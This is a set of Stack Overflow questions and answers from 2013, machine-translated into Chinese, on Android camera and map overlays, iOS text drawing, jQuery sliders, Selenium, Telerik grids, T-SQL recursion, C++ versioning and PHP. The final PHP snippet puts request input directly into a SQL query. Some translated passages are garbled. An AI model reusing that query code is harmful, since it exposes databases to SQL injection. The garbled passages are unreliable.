gradient.colors = [NSArray arrayWithObjects:(id)[[UIColor colorWithWhite: 1.0 alpha: 0.0] CGColor], (id)[[UIColor colorWithWhite: 1.0 alpha: 1.0] CGColor], nil];
gradient.startPoint = CGPointMake(0.5f, 0.0f);
gradient.endPoint = CGPointMake(0.5f, 0.5f);
self.map.layer.mask = gradient; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-21T18:16:36.363

不幸的是，如果两个组件都必须是交互式/实时的，那么您不能在相机预览和地图之间交叉淡入淡出。正如之前的评论中所述，这与小部件的性质和 Android 合成的局限性有关。

相机预览需要一个`SurfaceView`才能正常工作。来自官方文档：

> SurfaceView 在其窗口中打了一个孔以显示其表面。视图层次结构将负责正确地将 SurfaceView 的任何兄弟姐妹与 Surface 合成，这些兄弟通常会出现在它的顶部。这可用于在 Surface 顶部放置按钮等叠加层，但请注意，它可能会对性能产生影响，因为每次 Surface 更改时都会执行完整的 alpha 混合合成。

Google Maps v2`SurfaceView`也使用（看[这里](https://code.google.com/p/gmaps-api-issues/issues/detail?id=4782#c1)），所以基本上你有两个`SurfaceView`实例一个在另一个之上，你根本无法应用渐变蒙版来实现你想要的，因为你无法控制每个小部件的绘制方式本身：

*   相机预览`SurfaceView`接收相机缓冲区并本机渲染
*   地图`SurfaceView`在另一个进程中呈现。

此外，强烈建议不要同时使用两个实例，[如下](https://groups.google.com/forum/?fromgroups=#!topic/android-developers/fQihJKLki7M)`SurfaceView`所述：

> 实现表面视图的方式是在其包含的窗口后面创建一个单独的表面并按 Z 顺序排列，并将透明像素绘制到 SurfaceView 所在的矩形中，以便您可以看到后面的表面。我们从未打算允许多个表面视图。

我认为您唯一的选择是仅选择其中一个进行实时/交互，并将另一个作为静态图像渐变绘制在其上。

**编辑**

为了进一步验证我之前的陈述，下面引用官方文档[中有关相机使用](http://developer.android.com/reference/android/hardware/Camera.html)的内容：

> 重要提示：将**完全初始化**的 SurfaceHolder 传递给 setPreviewDisplay(SurfaceHolder)。**没有表面，相机将无法开始预览**。

因此，您必须使用 a`SurfaceView`才能从中获取预览`Camera`。总是。
再说一遍：您无法控制这些像素的渲染方式，因为使用 preview`Camera` **直接写入帧缓冲区**`SurfaceHolder`。

总之，您有两个**完全不透明的** `SurfaceView`实例，您根本无法对它们的内容应用任何精美的渲染，所以我认为这种效果在 Android 中根本不切实际。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-21T14:31:03.997

这可能，但可能有点复杂。为简单起见，我已将实现此目的的核心代码放在答案中。如前所述，您需要两个视图来执行此操作，一个“在”另一个“之上”。“较低”的应该是由地图 API 驱动的 SurfaceView。“更高”的应该显示相机图像淡出它。

编辑：正如 mr_archano 指出的那样，API（现在）被定义为没有 SurfaceView，相机将不会发送预览数据。哼哼，这就是进步的本质，不过，这也是可以克服的。

代码显示：

*   “较低”的 SurfaceView 直接由相机预览机制驱动。
*   “中间” SurfaceView 用于 MAPS API。
*   “上部”视图是渲染相机数据以实现所需效果的位置。

因此，核心代码给出了“相机预览”而不是“相机预览”，并且上面的图片被故意扭曲，因此它在顶部完全清晰可见，在中间褪色并在底部消失。

我可以建议使用此代码的最佳方法是自己实现前四个步骤并查看其工作，然后添加最后两个步骤并查看其工作，然后将关键概念插入另一个，无疑更大更多复杂的，一段代码。

前四步：

1.  创建自定义视图以显示到顶部、相机、视图。这个类在它下面的任何东西上渲染一个位图。位图中每个像素的 alpha 值将决定有多少下部视图可以通过。

    ```
    public class CameraOverlayView extends View {
        private Paint  paint;
        private Size   incomingSize;
        private Bitmap bitmap = null;

        public CameraOverlayView(Context context) {
            super(context);
            init();
        }

        public CameraOverlayView(Context context, AttributeSet attrs) {
            super(context, attrs);
            init();
        }

        private void init() {
            paint = new Paint();
            paint.setStyle(Style.FILL_AND_STROKE);
            paint.setColor(0xffffffff);
            paint.setTextSize((float) 20.0);
        }

        @Override
        protected void onDraw(Canvas canvas) {
            super.onDraw(canvas);

            int width  = canvas.getWidth();
            int height = canvas.getHeight();

            canvas.drawBitmap(bitmap, 0.0f, 0.0f, paint);
        }
    } 
    ```

2.  将三个视图放在一个框架中，并将它们都设置为`fill_parent`两个方向。第一个将在“下方”（SurfaceView，因此相机预览有效）。第二个“在中间”（地图的表面视图或其他）。第三个“在顶部”（褪色相机图像的视图）。

    ```
    <SurfaceView
        android:id="@+id/beneathSurfaceView"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent" />

    <SurfaceView
        android:id="@+id/middleSurfaceView"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent" />

    <com.blah.blah.blah.CameraOverlayView
        android:id="@+id/aboveCameraView"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent" /> 
    ```

3.  一个精简的主要活动，它将设置相机，并将自动预览图像发送到（底部）SurfaceView，并将预览图像数据发送到处理例程。它设置一个回调来捕获预览数据。这两个并行运行。

    ```
    public class CameraOverlay extends Activity implements SurfaceHolder.Callback2 {

        private SurfaceView       backSV;
        private CameraOverlayView cameraV;
        private SurfaceHolder cameraH;
        private Camera        camera=null;

        private Camera.PreviewCallback cameraCPCB;

        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.camera_overlay);

            // Get the two views        
            backSV  = (SurfaceView) findViewById(R.id.beneathSurfaceView);
            cameraV = (CameraOverlayView) findViewById(R.id.aboveCameraView);

            // BACK: Putting the camera on the back SV (replace with whatever is driving that SV)
            cameraH  = backSV.getHolder();
            cameraH.addCallback(this);

            // FRONT: For getting the data from the camera (for the front view)
            cameraCPCB = new Camera.PreviewCallback () {
                @Override
                public void onPreviewFrame(byte[] data, Camera camera) {
                    cameraV.acceptCameraData(data, camera);
                }
            };
        }

        // Making the camera run and stop with state changes
        @Override
        public void onResume() {
            super.onResume();
            camera = Camera.open();
            camera.startPreview();
        }

        @Override
        public void onPause() {
            super.onPause();
            camera.setPreviewCallback(null);
            camera.stopPreview();
            camera.release();
            camera=null;
        }

        private void cameraImageToViewOn() {
            // FRONT
            cameraV.setIncomingSize(camera.getParameters().getPreviewSize());
            camera.setPreviewCallback(cameraCPCB);
        }

        private void cameraImageToViewOff() {
            // FRONT
            camera.setPreviewCallback(null);
        }

        // The callbacks which mean that the Camera does stuff ...
        @Override
        public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {
            // If your preview can change or rotate, take care of those events here.
            // Make sure to stop the preview before resizing or reformatting it.

            if (holder == null) return;

            // stop preview before making changes
            try {
                cameraImageToViewOff(); // FRONT
                camera.stopPreview();
                } catch (Exception e){
                // ignore: tried to stop a non-existent preview
            }

            // set preview size and make any resize, rotate or reformatting changes here

            // start preview with new settings
            try {
                camera.setPreviewDisplay(holder); //BACK
                camera.startPreview();
                cameraImageToViewOn(); // FRONT
            } catch (Exception e){
            }
        }

        @Override
        public void surfaceCreated(SurfaceHolder holder) {
            try {
                camera.setPreviewDisplay(holder); //BACK
                camera.startPreview();
                cameraImageToViewOn(); // FRONT
            } catch (IOException e) {
            }       
        }

        @Override
        public void surfaceDestroyed(SurfaceHolder holder) {
    }

        @Override
        public void surfaceRedrawNeeded(SurfaceHolder holder) {
        }
    } 
    ```

    缺少一些东西：

    *   确保相机图像方向正确
    *   确保相机预览图像是最佳尺寸
4.  现在，向第一步中创建的视图添加两个函数。第一个确保 View 知道传入图像数据的大小。第二个接收预览图像数据，将其转换为位图，沿途扭曲它以提高可见性和演示 alpha 渐变。

    ```
    public void setIncomingSize(Size size) {
        incomingSize = size;
        if (bitmap != null) bitmap.recycle();
        bitmap = Bitmap.createBitmap(size.width, size.height, Bitmap.Config.ARGB_8888);
    }

    public void acceptCameraData(byte[] data, Camera camera) {
        int width  = incomingSize.width;
        int height = incomingSize.height;

        // the bitmap we want to fill with the image
        int numPixels = width*height;

        // the buffer we fill up which we then fill the bitmap with
        IntBuffer intBuffer = IntBuffer.allocate(width*height);
        // If you're reusing a buffer, next line imperative to refill from the start, - if not good practice
        intBuffer.position(0);

        // Get each pixel, one at a time
        int Y;
        int xby2, yby2;
        int R, G, B, alpha;
        float U, V, Yf;
        for (int y = 0; y < height; y++) {
            // Set the transparency based on how far down the image we are:
            if (y<200) alpha = 255;          // This image only at the top
            else if (y<455) alpha = 455-y;   // Fade over the next 255 lines
            else alpha = 0;                  // nothing after that
            // For speed's sake, you should probably break out of this loop once alpha is zero ...

            for (int x = 0; x < width; x++) {
                // Get the Y value, stored in the first block of data
                // The logical "AND 0xff" is needed to deal with the signed issue
                Y = data[y*width + x] & 0xff;

                // Get U and V values, stored after Y values, one per 2x2 block
                // of pixels, interleaved. Prepare them as floats with correct range
                // ready for calculation later.
                xby2 = x/2;
                yby2 = y/2;
                U = (float)(data[numPixels + 2*xby2 + yby2*width] & 0xff) - 128.0f;
                V = (float)(data[numPixels + 2*xby2 + 1 + yby2*width] & 0xff) - 128.0f;

                // Do the YUV -> RGB conversion
                Yf = 1.164f*((float)Y) - 16.0f;
                R = (int)(Yf + 1.596f*V);
                G = 2*(int)(Yf - 0.813f*V - 0.391f*U); // Distorted to show effect
                B = (int)(Yf + 2.018f*U);

                // Clip rgb values to 0-255
                R = R < 0 ? 0 : R > 255 ? 255 : R;
                G = G < 0 ? 0 : G > 255 ? 255 : G;
                B = B < 0 ? 0 : B > 255 ? 255 : B;

                // Put that pixel in the buffer
                intBuffer.put(Color.argb(alpha, R, G, B));
            }
        }

        // Get buffer ready to be read
        intBuffer.flip();

        // Push the pixel information from the buffer onto the bitmap.
        bitmap.copyPixelsFromBuffer(intBuffer);

        this.invalidate();
    } 
    ```

    关于第二个例程的注意事项：

    *   它假定传入的相机格式 NV21。其他人可能可用，这个保证在那里，即使它是一种痛苦。请参阅[在 android 的 onPreviewFrame 期间转换 YUV->RGB(图像处理)->YUV？](https://stackoverflow.com/questions/9325861/converting-yuv-rgbimage-processing-yuv-during-onpreviewframe-in-android/10125048#10125048).
    *   通过更新版本的 Android 和一些代码优化，它可能会更快或更好地完成。

该代码显示了基本思想。然后进入下一阶段：

1.  将相机表面视图设置为足够小以隐藏在顶视图的非褪色部分后面。即，将`android:layout_height`其更改为`60dp`.

2.  设置中间的 SurfaceView 接收地图信息。

# javascript - bxSlider 只显示一个子弹和我的第一张图片

> ID：16091050
> 
> 赞同：1
> 
> 时间：2013-04-18T18:59:16.853
> 
> 标签：javascript, jquery, bxslider

我知道非常基本的html和css。而且我可能听起来很愚蠢，但无论如何，我真的很想知道我在这里缺少什么。当我将代码放入 jsFiddle （[http://jsfiddle.net/FLuRH/17/](http://jsfiddle.net/FLuRH/17/)）时，它工作正常。但是在我的文件中，它只在左上角显示一个图像和一个项目符号。我到处都是，我只在这里找到了一些让我“检查”我的目录和链接的东西。

**我已经链接到：**

```
//ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js
js/jquery.bxslider.min.js
js/jquery.bxslider.css 
```

**图片列表：** 我使用 .svg 格式和相同的高度/宽度，它们通过 href 链接到相应的页面，并包含在列表标签​​中。（我有大约 10 张图片）

**Javascript：**

```
<script type="text/javascript">
  $(document).ready(function(){
    $('.bxslider').bxSlider({
        mode: 'fade',
        speed:300,
        auto: true,
        autoHover: true
    });
  });
</script> 
```

# selenium - Selenium IDE-自动化 Select2 搜索框

> ID：16091053
> 
> 赞同：8
> 
> 时间：2013-04-18T18:59:33.743
> 
> 标签：selenium, ide, jquery-select2

我正在尝试自动化 selenium IDE 中的 select2 搜索框。我打开它并输入了我正在搜索的搜索关键字。但是，即使我有显示结果的代码，它也不起作用。问题是我猜这些字符输入得太快了，所以搜索框没有显示结果。我确定我在某个地方出错了，因为我是 Selenium IDE 的新手。因此，感谢您的帮助

```
 mouseDown css=.select2-choice > div > b
  type css=input.select2-input.select2-focused Chris
  waitForVisible css=.select2-results
  mouseUp css=.select2-result-label:contains('Chris') 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-07-16T15:27:32.867

我也不得不处理这个问题，我测试的站点使用 select2 和 select3。我发现在这两种情况下都有效的情况如下：

```
clickAt | css=.select2-choice > div > b | 
sendKeys | css=input.select2-input.select2-focused | Chris
click | css=.select2-result-label:contains('Chris') 
```

使用这些类型的下拉菜单和 Angular，我发现 sendKeys 比 type 或 typeKeys 效果更好。

克伦达图

# ios - UITextView 两次绘制文本

> ID：16091054
> 
> 赞同：3
> 
> 时间：2013-04-18T18:59:45.670
> 
> 标签：ios, uitextview

我正在尝试在我的 UITextViews 文本上创建描边文本。它工作正常，但文本在屏幕上绘制了两次。这是我在 UITextView 的子类中的 drawRect 方法...

```
- (void)drawRect:(CGRect)rect
{
    // Drawing code
    // Drawing code

    UIFont *font = [UIFont fontWithName:@"Cochin" size:[_fontSize floatValue]];

    CGContextRef context = UIGraphicsGetCurrentContext();
    CGContextSetShadow(context, CGSizeMake(1, 1), 1);
    CGContextSetRGBFillColor(context,1,1,1, 1);
    CGContextSetRGBStrokeColor(context, 0, 0, 0, 1);
    CGContextSetLineWidth(context, .35);
    CGContextSetTextDrawingMode(context, kCGTextFillStroke);
    CGContextSaveGState(context);
    [[self text] drawInRect:rect withFont:font];
} 
```

我尝试将 clearsContextOnDraw 设置为 YES，但这并没有成功。请帮忙...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T20:09:10.250

我刚刚尝试了您的代码，它确实对我有用。不过有几点注意事项：

1.  您应该将`self.bounds`其用作要绘制的目标矩形，而不是`rect`您获得的参数，因为这意味着“这是您视图的无效区域”。这是一项性能优化，您很少需要使用它。

2.  你不需要打电话`CGContextSaveGState`（当你打电话时，你会想要在那之后恢复它）。当您调用实际修改当前上下文（并在之后恢复它）的子例程时，您通常会这样做，但理想情况下，这应该移动例程本身。

尝试将视图的背景设置为白色并使字体更大，您可能会得到正在发生的事情的提示。此外，您可以在此处发布屏幕截图。

更新：

我没有注意到你在使用`UITextView`. 您不应该使用此类并进行自定义绘图！如果您想自己绘制文本，请使用 subclass `UIView`。如果您想使用`UITextView`，请使用(例如，在您的子类中设置它的`attributedString`属性。这是有关属性字符串的更多信息：[Apple docs](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSAttributedString_Class/Reference/Reference.html)`UITextView``viewDidLoad``UIViewController`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-05-28T09:30:18.040

哦，天哪，文本系统是一个由很多很多（大部分是私有的）类、方法和数据结构组成的复杂野兽。

你有 NSTextStorage、NSLayoutManager、NSTextContainer 和 UITextView 作为公共类。投入 UITextRange 和 UITextPosition 以获得良好的衡量标准。在 Mac OS X 上，您也有排版类。

虽然 UITextView 要求 NSLayoutManager 在某些矩形区域中绘制文本（通过私有方法而不是 drawRect），但绘制本身实际上是由 NSLayoutManager 完成的。如果你想自己绘制文本，你必须提供你自己的 NSLayoutManager 子类。

使用 NSLayoutManager 子类作为最后的手段。要么使用自定义 uiview 自己绘制框架和文本，要么使用 uitextview 并尝试找出系统正在绘制文本的位置。为此，您将需要 NSLayoutManager 方法。绘制框架，但不绘制 uitextview 类的 drawRect 中的文本。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T21:03:27.313

你永远不应该直接调用 drawRect 。

代替：

```
[[self text] drawInRect:rect withFont:font]; 
```

尝试：

```
[[self text] setNeedsDisplayInRect:rect]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-06-15T08:48:18.253

我用它来避免这个问题

```
- (void)drawRect:(CGRect)rect{

    //YOUR Drawing code here ...

    self.textColor = [UIColor clearColor];
} 
```

# asp.net - Telerik RadGrid 的 JSON 基元无效

> ID：16091063
> 
> 赞同：2
> 
> 时间：2013-04-18T19:00:25.117
> 
> 标签：asp.net, json, telerik, radgrid

我被难住了。

我正在处理使用 Telerik RadGrids 的应用程序页面。我想这很简单。网格中的每一行都有一个 EditFormSettings 模板集。里面有一个 DropDownList 和一个 Panel。DropDownList 包含许多要显示的不同报告，因此当用户选择某些内容时，UserControl 会动态添加到此面板并显示一个报告，该报告是另一个 RadGrid 或先前制作的 UserControl 内的 RadRadialGauge。该功能可以正常工作。

如果在此面板中加载了 RadGrid，则当我去展开另一行时，问题就来了。显示以下错误：

*描述：在执行当前 Web 请求期间发生了未处理的异常。请查看堆栈跟踪以获取有关错误及其源自代码的位置的更多信息。

异常详细信息：System.ArgumentException：无效的 JSON 原语：.*

如果第一次加载 RadRadialGauge 并且我去扩展另一行，则不会发生这种情况。仅当它是带有 RadGrid 的 UserControl 时。这个 UserControl 非常基本，所以我认为上面没有任何东西可能是罪魁祸首。

一些代码可以帮助解释我写的内容。

```
<EditFormSettings EditFormType="Template">
    <FormTemplate> 
        <div id="dashboardExpandedTemplate">                            
            <asp:DropDownList ID="ddlReportsList" AutoPostBack="true" OnSelectedIndexChanged="ReportSelected" runat="server" />
            <asp:Panel ID="pnlReports" runat="server" />
         </div>
    </FormTemplate>
</EditFormSettings>

protected void ReportSelected(object sender, EventArgs e)
{
    DropDownList ddl = (DropDownList)sender;

    if (ddl.SelectedIndex != 0)
    {
        GridEditFormItem editItem = (GridEditFormItem)ddl.NamingContainer;
        Panel pnlReports = (Panel)editItem.FindControl("pnlReports");
        pnlReports.Controls.Clear();

        SavedReport saved = new SavedReport(int.Parse(ddl.SelectedValue));
        Control cntrl = Page.LoadControl("/controls/" + saved.ControlPath);                  
     }
} 
```

提前谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-02-07T18:09:32.330

想我会根据您的评论部分发布此答案。我 `ClientIDMode="Static"`在我的 GridTemplateColumn 上设置了

```
<telerik:GridTemplateColumn>
    <ItemTemplate>
        <telerik:RadButton OnClientClicked="windowShow" ClientIDMode="Static" Text="Example" runat="server">
        </telerik:RadButton>
    </ItemTemplate>
</telerik:GridTemplateColumn> 
```

OP 似乎从`ClientIDMode="Static"`在主 RadGrid 标签上设置错误。我想我们都应该远离将这个属性与 Telerik 混合。在我终于找到这篇文章之前，我花了半天时间在谷歌上搜索。

# http-post - 为什么返回按钮不适用于 HTTP POST？

> ID：16091067
> 
> 赞同：1
> 
> 时间：2013-04-18T19:00:49.687
> 
> 标签：http-post, back, http-get

使用 HTTP POST 提交页面时无法使用浏览器返回按钮的原因是什么？但是 HTTP GET 可以吗？我已经读过浏览器试图阻止多个 POST（以避免对服务器进行多次更新），因为它无法区分浏览器上的 BACK 和 RELOAD 之间的区别？浏览器如何无法区分 BACK 和 RELOAD？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T19:18:09.150

Back 不是发往服务器的特殊请求。Back 只是导航到上一页，就像您刚刚在导航栏中输入 url 并点击 go 一样。从服务器的角度来看，这与重新加载实际上与基本页面请求相同。它们都只是 GET 请求。

当您回击使用帖子的页面时，它会重新发送帖子而不是获取。通常，浏览器内置了针对这种情况的保护措施（“您确定要返回吗？浏览器将重新发送以前提交的信息”）。

它不重新加载这样的帖子的原因是，就像您说的那样，它不想将用于获取该页面的信息重新发送到服务器，因为它会重复发布某些内容或重复购买某些内容。

# code-coverage - 使用 Jenkins CI 设置 Grails -code-coverage 插件的步骤？

> ID：16091068
> 
> 赞同：3
> 
> 时间：2013-04-18T19:00:54.887
> 
> 标签：code-coverage, grails-plugin, jenkins-plugins

有没有人用 Jenkins CI 设置 Grails -code-coverage 插件？

如果是这样，请引导我完成设置？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-19T10:01:07.780

你可以试试这个教程：[代码覆盖率](http://leanjavaengineering.wordpress.com/2010/09/09/grails-testing-in-hudson/)

# java - 将实例变量传递给实例方法与直接访问它们？

> ID：16091070
> 
> 赞同：7
> 
> 时间：2013-04-18T19:00:57.047
> 
> 标签：java, code-design

想象一下我有一个带有实例成员的类

```
String instanceMember; 
```

此外，我有 4 个实例方法访问此成员。现在我想知道是否有任何真正的优点/缺点可以直接从实例方法访问实例成员或将实例成员作为参数传递给每个实例方法？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-18T19:05:17.120

将值作为参数传递意味着您将使用参数值而不是封装值执行计算。

如果您要对封装数据进行操作，则没有理由将其作为参数。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-18T19:05:47.030

*首先拥有实例*变量的原因是避免将它们作为参数传递：您的*实例*方法可以“免费”访问它们，因为它们已经在方法的范围内。

但是，将实例变量传递给方法有两个原因：

*   **方法是`static`**——类方法不能访问实例变量，所以需要显式传递，或者传递要操作的对象
*   **您需要使用按值传递语义**- 换句话说，您希望修改传入的值，并且希望避免创建局部变量。当方法是*递归*的时，通常会出现这种情况。

如果您发现自己编写的递归代码修改了作为实例变量开始的参数，那么在许多情况下，创建您的方法`private static`并添加一个`public`实例方法来启动递归链并收集结果可能是个好主意。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T19:06:42.627

这在很大程度上取决于您如何使用它。如果你的类的使用不频繁，那么不会有明显的区别。

如果您大量使用类实例，并且通过许多线程，那么在某些情况下，将其作为参数传递会更快一些。

通常实例成员由类成员直接访问，具有静态函数的例外（由于显而易见的原因）。

因此，请遵循您的编码约定，不要担心。到真正重要的时候，您将牢记答案。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-18T19:04:13.877

如果这些方法是操纵持久成员变量状态的公共方法，那么您实际上不应该传递它。例如，如果您必须执行以下操作，则可能应该直接由方法操作而不是传入：

```
myObject.SomeMethod(myObject.instanceMember, 15); 
```

这应该只是：

```
myObject.SomeMethod(15); 
```

如果它在每次调用时可能会发生变化（例如，`15`上面方法中的神秘），你会想要传递它。

# c++ - c++ 按时间和日期自动递增构建版本

> ID：16091071
> 
> 赞同：1
> 
> 时间：2013-04-18T19:00:59.310
> 
> 标签：c++, visual-c++

我正在尝试按时间和日期创建自动增量构建版本

我无法在#define 中添加日期和时间

版本.h 文件

```
#define STRINGIZE2(s) #s
#define STRINGIZE(s) STRINGIZE2(s)

#define VERSION_MAJOR     5
#define VERSION_MINOR     0
#define VERSION_REVISION  2
#define VERSION_BUILD     1

#define PRODUCTVER         VERSION_MAJOR, VERSION_MINOR, VERSION_REVISION, VERSION_BUILD
#define STRFILEVER        STRINGIZE(VERSION_MAJOR)  "." STRINGIZE(VERSION_MINOR) "." STRINGIZE(VERSION_REVISION) "." STRINGIZE(VERSION_BUILD) 
```

.rc 文件

```
VS_VERSION_INFO VERSIONINFO
 FILEVERSION PRODUCTVER
 PRODUCTVERSION PRODUCTVER

            VALUE "FileVersion", STRFILEVER
            VALUE "ProductVersion", STRFILEVER 
```

我试过了

```
#define VERSION_MAJOR     __DATE__
#define VERSION_MINOR      __TIME__
#define VERSION_REVISION  2
#define VERSION_BUILD     1 
```

我也尝试了其他方法，比如

```
time_t now;
struct tm *current;
now = time(0);
current = localtime(&now);
    #define VERSION_MAJOR    current->tm_wday
    #define VERSION_MINOR      current->tm_hour
    #define VERSION_REVISION  2
#define VERSION_BUILD     1 
```

没有成功

我只是想在定义中添加日期和时间

我希望有一个解决方案

谢谢你

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T20:04:07.730

给定下面的示例，我们有一个构建脚本修改版本文本中的值。

```
static const char   version_text[] = "519";
char const *
Version_Get_Text(void)
{
    return version_text;
}

unsigned int
Version_Text_Length(void)
{
    return sizeof(version_text) - 1U;
} 
```

不需要凌乱的`#define`宏。这些函数还保留了运行时和类型安全：当版本更改时，访问这些函数的所有文件都不需要重新构建；只有这个模块。

这项技术与我们的自动构建服务器相结合，到目前为止已经持续了一年，没有出现任何问题。

此外，不需要优化。访问版本不是我们产品核心操作的一部分；它仅在初始化期间首次显示调试提示或用户发送命令询问版本时发生。在这些情况下，执行时间并不重要。

# sql-server - TSQL：处理数据中的无限循环

> ID：16091075
> 
> 赞同：3
> 
> 时间：2013-04-18T19:01:07.267
> 
> 标签：sql-server, tsql

我有一个表 FolderXDoc：

```
CREATE TABLE [dbo].[FolderXDoc](
[fldid] [int] NOT NULL,
[Xorder] [int] NOT NULL,
[docid] [int] NOT NULL,
CONSTRAINT [FolderXDoc$pk] PRIMARY KEY CLUSTERED 
(
[fldid] ASC,
[Xorder] ASC,
[docid] ASC
)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
) ON [PRIMARY] 
```

我的应用程序允许此表中的循环引用，因此允许以下数据：

```
fldid|Xorder|docid
1|1|2
2|1|3
3|1|4
4|1|2 
```

所以文件夹 1 包含文件夹 2，文件夹 2 包含文件夹 3。文件夹 3 包含文件夹 4。文件夹 4 包含文件夹 2，因此我们有一个循环（1/2/3/4/2/3/4/2/3/4/. ..)

现在我想递归检索文件夹的所有包含元素。我用 CTE 试过这个，但由于数据的循环，这不起作用。我想在检测到循环时停止递归。因此，当我检索 1 的包含元素时，我期望结果集 (2,3,4)。

我用用户定义的函数尝试了这个：

```
CREATE FUNCTION [dbo].[DocChildren](@fldid int)
RETURNS TABLE
AS
RETURN
(
     WITH n AS 
           (SELECT f.fldid, f.docid
            FROM folderxdoc f where f.fldid = @fldid
           UNION ALL

           SELECT n.fldid, nplus1.docid  
            FROM folderxdoc as nplus1, n
                WHERE n.docid = nplus1.fldid and n.docid != @fldid)

     SELECT docid FROM n
  ) 
```

该函数处理起始 id 的循环循环，但当循环发生在包含的元素中时不处理。我能做些什么来解决这个问题？

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:15:22.847

也许在访问节点时标记临时表可能会有所帮助。

基本上，当您访问每个节点时，将其推送到临时表中并根据临时表检查每个节点。找到现有节点时停止。

可能需要游标来实现这一点，尽管这可能很糟糕。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T07:14:51.607

我使用@HaBo 的提示解决了这个问题。

我在递归期间组装了路径并检查了重复条目。您可以在此处找到生成的查询： [http ://sqlfiddle.com/#!3/cc8b3/1](http://sqlfiddle.com/#!3/cc8b3/1)

```
 WITH n AS 
       (SELECT f.fldid, f.docid, ',' + cast(f.fldid as varchar(max)) + ',' levels
        FROM folderxdoc f where f.fldid = 1
       UNION ALL

       SELECT n.fldid, nplus1.docid,n.levels+ cast(n.docid as varchar(max)) + ',' levels
        FROM folderxdoc as nplus1, n
            WHERE n.docid = nplus1.fldid AND
            n.levels not like ('%,' + cast(nplus1.docid as varchar(max)) + ',%')
       )

 SELECT fldid, docid, levels FROM n 
```

# php - PHP XHTML自动关闭输入不起作用

> ID：16091077
> 
> 赞同：2
> 
> 时间：2013-04-18T19:01:13.580
> 
> 标签：php, tags, xhtml-1.0-strict

我必须在 XHTML1.0 Strict 中做这个页面。我现在尝试了几个小时来获取像 `<input type="text" />`. 在 Firefox 和 Chrome 的开发者控制台中，它踢出了斜线。 **index.php 文件**：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<head>
    <meta charset="UTF-8">
    <title></title>
    <link rel="stylesheet" media="screen" href="css/default.css">
</head>
<body>
<? include "form.php"; ?>
</body>
</html> 
```

相关的 PHP 代码（这是我最后一次也是最简单的测试，因为我会开始想疯了！！）：

```
$inputTagStart = htmlspecialchars_decode('&lt;input name="test" value="andso" /&gt;'); 
```

**在 Chrome 中输出**（在 FF 中相同）

```
<input name="test" value="andso"> 
```

..和其他一些版本...

```
$inputTagStart = htmlspecialchars_decode("<label for='".$data['Label']."'>".$data['Label']."</label><input type='text' name='".$data['Label']."' value='".returnPostedTextData($data['Label'], $data['Default'])."' ".$classRequired." />", ENT_XHTML); 
```

**未创建Chrome** 输入标签中的输出

```
$inputTagStart = htmlspecialchars_decode("&lt;label for='dsf'&gt;df&lt;/label&gt;&lt;input type='text' name='dsf' value='s'/&gt;"); 
```

**在 Chrome 中输出**

```
<input type="text" name="dsf" value="s"> 
```

请帮忙，我不明白

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:07:22.150

浏览器的开发者控制台不会显示页面的实际来源（使用“查看源代码”）：它显示浏览器对页面内容的*解释*，由 javascript 修改（它还会显示浏览器的最佳猜测修复对于无效的 HTML）。

如果您输出没有 XHTML 标头的 XHTML，浏览器只会将其解释为稍微奇怪的 HTML，并相应地对其进行解释，并在其开发人员控制台中显示该解释。

*   如果您想查看页面的实际 XHTML 源代码，请使用“查看源代码”选项。
*   如果您想在开发人员控制台中查看 XHTML，请确保您正在输出 header `Content-Type: application/xhtml+xml`。

# php - 在php中，如何从android获取ID发送

> ID：16091082
> 
> 赞同：0
> 
> 时间：2013-04-18T19:01:34.967
> 
> 标签：php, android

我使用 eclipse 编写 android 应用程序和 php 网站。AndroidShowEvent 页面的编码：

```
 <?php
    $dbhost = ''; //due to security problem, it will not show
    $dbuser = ''; //due to security problem, it will not show
    $dbpass = ''; //due to security problem, it will not show
    mysql_select_db('u507295856_ems');
    mysql_query("SET NAMES 'utf8'"); 
    $sql=mysql_query("select * from event where Event_ID = '".$_REQUEST['eid']."'");
    while($row=mysql_fetch_assoc($sql))
        $output[]=$row;
        $JSON = json_encode($output);
        print ($JSON);
    mysql_close();
    ?> 
```

AndroidEvent页面的编码：

```
 <?php
    $dbhost = ''; //due to security problem, it will not show
    $dbuser = ''; //due to security problem, it will not show
    $dbpass = ''; //due to security problem, it will not show
    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
    mysql_select_db('u507295856_ems');
    mysql_query("SET NAMES 'utf8'");
    $sql=mysql_query("select * from event order by Event_StartDate DESC");
    while($row=mysql_fetch_assoc($sql))
        $output[]=$row;
        $JSON = json_encode($output);
        print ($JSON);
    mysql_close();
    ?> 
```

